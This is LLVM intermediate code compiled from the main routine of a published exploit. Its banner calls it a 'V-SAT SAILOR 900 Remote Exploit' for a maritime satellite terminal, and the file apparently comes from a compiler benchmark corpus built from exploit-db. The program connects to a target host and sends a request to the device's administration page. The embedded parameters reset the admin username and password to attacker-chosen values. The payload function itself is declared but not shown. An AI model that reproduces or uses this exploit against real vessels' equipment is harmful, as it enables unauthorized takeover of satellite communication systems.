; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_35932.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_35932.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }
%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i64 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [33 x i8] c"/index.lua?pageID=administration\00", align 1
@.str.1 = private unnamed_addr constant [56 x i8] c"&usernameAdmChange=admin&passwordAdmChange=aisatpwn2134\00", align 1
@.str.2 = private unnamed_addr constant [73 x i8] c"***********************************************************************\0A\00", align 1
@.str.3 = private unnamed_addr constant [73 x i8] c"(Advanced Information Security Corporation, 2014 - All Rights Reserved*\0A\00", align 1
@.str.4 = private unnamed_addr constant [73 x i8] c"*                                                                     *\0A\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"*                (V-SAT SAILOR 900 Remote Exploit)                    *\0A\00", align 1
@.str.6 = private unnamed_addr constant [73 x i8] c"* Disclaimer: This is proprietary source code material of Advanced    *\0A\00", align 1
@.str.7 = private unnamed_addr constant [73 x i8] c"* Information Security Corporation. This software is for              *\0A\00", align 1
@.str.8 = private unnamed_addr constant [73 x i8] c"* research purposes only.                                             *\0A\00", align 1
@.str.9 = private unnamed_addr constant [73 x i8] c"*    VSAT Sailor 900 / Tested on iDirect Infiniti VMU v.1.47 Build 9  *\0A\00", align 1
@.str.10 = private unnamed_addr constant [73 x i8] c"* Description:                                                        *\0A\00", align 1
@.str.11 = private unnamed_addr constant [73 x i8] c"* The Sailor 900 VSAT is an advanced maritime stabilised Ku/Ka band   *\0A\00", align 1
@.str.12 = private unnamed_addr constant [73 x i8] c"* platform with integrated GPS, compatible with a number of satellite *\0A\00", align 1
@.str.13 = private unnamed_addr constant [73 x i8] c"* networks, such as Jabiru, Inmarsat GX, and Intelsat's Epic.         *\0A\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [13 x i8] c" Main Menu \0A\00", align 1
@.str.16 = private unnamed_addr constant [26 x i8] c" Usage: %s <host> <port>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.17 = private unnamed_addr constant [22 x i8] c"socket creation error\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"connection \00", align 1
@errno = common dso_local global i64 0, align 8
@F_GETFL = common dso_local global i32 0, align 4
@O_NONBLOCK = common dso_local global i64 0, align 8
@F_SETFL = common dso_local global i32 0, align 4
@.str.19 = private unnamed_addr constant [12 x i8] c"fcntl error\00", align 1
@.str.20 = private unnamed_addr constant [7 x i8] c"select\00", align 1
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_ERROR = common dso_local global i32 0, align 4
@.str.21 = private unnamed_addr constant [42 x i8] c"Socket Connection Error Code at: %d - %s\0A\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.23 = private unnamed_addr constant [49 x i8] c"[RST-FCNTL] FCNTL Error. Exiting the software.\0A\0A\00", align 1
@.str.24 = private unnamed_addr constant [76 x i8] c"\0A\0A[x] Payload Sent. Please check server responses above to verify status.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.timeval, align 8
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.hostent*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  store i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.1, i64 0, i64 0), i8** %7, align 8
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %47

21:                                               ; preds = %2
  %22 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.3, i64 0, i64 0))
  %24 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.2, i64 0, i64 0))
  %25 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.4, i64 0, i64 0))
  %26 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i64 0, i64 0))
  %27 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.2, i64 0, i64 0))
  %28 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.6, i64 0, i64 0))
  %29 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.7, i64 0, i64 0))
  %30 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.8, i64 0, i64 0))
  %31 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.2, i64 0, i64 0))
  %32 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i64 0, i64 0))
  %33 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.10, i64 0, i64 0))
  %34 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i64 0, i64 0))
  %35 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.12, i64 0, i64 0))
  %36 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.13, i64 0, i64 0))
  %37 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.2, i64 0, i64 0))
  %38 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0))
  %39 = load i32, i32* @stderr, align 4
  %40 = call i32 (i32, i8*, ...) @fprintf(i32 %39, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.15, i64 0, i64 0))
  %41 = load i32, i32* @stderr, align 4
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.16, i64 0, i64 0), i8* %44)
  %46 = call i32 @exit(i32 1) #3
  unreachable

47:                                               ; preds = %2
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call %struct.hostent* @gethostbyname(i8* %50)
  store %struct.hostent* %51, %struct.hostent** %15, align 8
  %52 = load i32, i32* @AF_INET, align 4
  %53 = load i32, i32* @SOCK_STREAM, align 4
  %54 = call i32 @socket(i32 %52, i32 %53, i32 0)
  store i32 %54, i32* %9, align 4
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  %59 = call i32 @htons(i32 %58)
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  store i32 %59, i32* %60, align 4
  %61 = load i32, i32* @INADDR_ANY, align 4
  %62 = call i32 @htonl(i32 %61)
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %63, i32 0, i32 0
  store i32 %62, i32* %64, align 4
  %65 = load %struct.hostent*, %struct.hostent** %15, align 8
  %66 = getelementptr inbounds %struct.hostent, %struct.hostent* %65, i32 0, i32 1
  %67 = load i64, i64* %66, align 8
  %68 = inttoptr i64 %67 to %struct.in_addr*
  %69 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %68, i32 0, i32 0
  %70 = load i32, i32* %69, align 4
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %72 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %71, i32 0, i32 0
  store i32 %70, i32* %72, align 4
  %73 = load i32, i32* @AF_INET, align 4
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i32 %73, i32* %74, align 4
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  %76 = load i32, i32* %75, align 4
  %77 = call i32 @memset(i32 %76, i32 0, i32 4)
  %78 = load i32, i32* @stdout, align 4
  %79 = call i32 @fflush(i32 %78)
  %80 = load i32, i32* %9, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %84

82:                                               ; preds = %47
  %83 = call i32 @perror(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.17, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %185

84:                                               ; preds = %47
  %85 = call i32 @FD_ZERO(i32* %17)
  %86 = load i32, i32* %9, align 4
  %87 = call i32 @FD_SET(i32 %86, i32* %17)
  %88 = call i32 @FD_ZERO(i32* %18)
  %89 = load i32, i32* %9, align 4
  %90 = call i32 @FD_SET(i32 %89, i32* %18)
  %91 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i32 3, i32* %91, align 8
  %92 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 0, i64* %92, align 8
  %93 = load i32, i32* %9, align 4
  %94 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %95 = call i32 @connect(i32 %93, %struct.sockaddr* %94, i32 4)
  store i32 %95, i32* %12, align 4
  %96 = load i32, i32* %12, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %100

98:                                               ; preds = %84
  %99 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %185

100:                                              ; preds = %84
  %101 = load i64, i64* @errno, align 8
  %102 = icmp ne i64 %101, 0
  br i1 %102, label %103, label %105

103:                                              ; preds = %100
  %104 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %185

105:                                              ; preds = %100
  %106 = load i32, i32* %9, align 4
  %107 = load i32, i32* @F_GETFL, align 4
  %108 = call i32 @fcntl(i32 %106, i32 %107, i64 0)
  %109 = sext i32 %108 to i64
  store i64 %109, i64* %8, align 8
  %110 = load i64, i64* @O_NONBLOCK, align 8
  %111 = load i64, i64* %8, align 8
  %112 = or i64 %111, %110
  store i64 %112, i64* %8, align 8
  %113 = load i32, i32* %9, align 4
  %114 = load i32, i32* @F_SETFL, align 4
  %115 = load i64, i64* %8, align 8
  %116 = call i32 @fcntl(i32 %113, i32 %114, i64 %115)
  %117 = load i32, i32* %9, align 4
  %118 = load i32, i32* @F_SETFL, align 4
  %119 = load i64, i64* @O_NONBLOCK, align 8
  %120 = call i32 @fcntl(i32 %117, i32 %118, i64 %119)
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %124

122:                                              ; preds = %105
  %123 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.19, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %185

124:                                              ; preds = %105
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, 1
  %127 = call i32 @select(i32 %126, i32* null, i32* %17, i32* null, %struct.timeval* %13)
  store i32 %127, i32* %10, align 4
  %128 = load i32, i32* %10, align 4
  %129 = icmp eq i32 %128, -1
  br i1 %129, label %130, label %132

130:                                              ; preds = %124
  %131 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.20, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %185

132:                                              ; preds = %124
  %133 = load i32, i32* %10, align 4
  %134 = icmp sgt i32 %133, 0
  br i1 %134, label %135, label %185

135:                                              ; preds = %132
  store i32 4, i32* %16, align 4
  %136 = load i32, i32* %9, align 4
  %137 = load i32, i32* @SOL_SOCKET, align 4
  %138 = load i32, i32* @SO_ERROR, align 4
  %139 = bitcast i32* %11 to i8*
  %140 = call i32 @getsockopt(i32 %136, i32 %137, i32 %138, i8* %139, i32* %16)
  %141 = load i32, i32* %11, align 4
  %142 = icmp ne i32 %141, 0
  br i1 %142, label %143, label %150

143:                                              ; preds = %135
  %144 = load i32, i32* @stderr, align 4
  %145 = load i32, i32* %11, align 4
  %146 = load i32, i32* %11, align 4
  %147 = call i8* @strerror(i32 %146)
  %148 = call i32 (i32, i8*, ...) @fprintf(i32 %144, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.21, i64 0, i64 0), i32 %145, i8* %147)
  %149 = call i32 @exit(i32 0) #3
  unreachable

150:                                              ; preds = %135
  %151 = load i32, i32* %9, align 4
  %152 = load i32, i32* @F_SETFL, align 4
  %153 = call i32 @fcntl(i32 %151, i32 %152, i64 0)
  %154 = icmp eq i32 %153, -1
  br i1 %154, label %155, label %158

155:                                              ; preds = %150
  %156 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i64 0, i64 0))
  %157 = call i32 @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.23, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %185

158:                                              ; preds = %150
  %159 = load i32, i32* %9, align 4
  %160 = load %struct.hostent*, %struct.hostent** %15, align 8
  %161 = getelementptr inbounds %struct.hostent, %struct.hostent* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 8
  %163 = load i8*, i8** %6, align 8
  %164 = load i8*, i8** %7, align 8
  %165 = call i32 @payload(i32 %159, i32 %162, i8* %163, i8* %164)
  %166 = icmp ne i32 %165, 1
  br i1 %166, label %167, label %169

167:                                              ; preds = %158
  %168 = call i32 @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.24, i64 0, i64 0))
  br label %169

169:                                              ; preds = %167, %158
  %170 = load i32, i32* %9, align 4
  %171 = load i32, i32* @F_GETFL, align 4
  %172 = call i32 @fcntl(i32 %170, i32 %171, i64 0)
  %173 = sext i32 %172 to i64
  store i64 %173, i64* %8, align 8
  %174 = load i64, i64* @O_NONBLOCK, align 8
  %175 = xor i64 %174, -1
  %176 = load i64, i64* %8, align 8
  %177 = and i64 %176, %175
  store i64 %177, i64* %8, align 8
  %178 = load i32, i32* %9, align 4
  %179 = load i32, i32* @F_SETFL, align 4
  %180 = load i64, i64* %8, align 8
  %181 = call i32 @fcntl(i32 %178, i32 %179, i64 %180)
  %182 = load i32, i32* %9, align 4
  %183 = call i32 @close(i32 %182)
  %184 = call i32 @exit(i32 1) #3
  unreachable

185:                                              ; preds = %82, %98, %103, %122, %130, %155, %132
  %186 = load i32, i32* %3, align 4
  ret i32 %186
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @memset(i32, i32, i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @fcntl(i32, i32, i64) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i32 @payload(i32, i32, i8*, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
